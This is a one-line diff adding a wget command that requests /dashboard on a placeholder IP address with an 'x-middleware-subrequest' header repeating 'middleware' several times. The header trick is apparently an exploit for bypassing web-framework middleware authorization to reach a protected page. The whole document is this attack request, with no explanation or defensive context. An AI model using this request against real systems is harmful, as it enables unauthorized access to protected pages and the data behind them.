@@ -1,0 +1,1 @@
+wget --header="x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" <IP_ADDRESS>/dashboard
